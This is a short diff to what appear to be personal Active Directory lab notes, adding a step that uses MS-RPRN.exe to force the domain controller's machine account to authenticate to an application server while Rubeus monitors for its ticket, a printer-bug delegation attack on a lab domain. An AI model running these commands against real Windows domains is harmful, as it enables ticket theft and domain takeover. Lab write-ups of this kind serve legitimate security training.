@@ -639,3 +639,7 @@ Launch rubeus
 C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 ![[Pasted image 20231025163953.png]]
+Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)
+```powershell
+C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
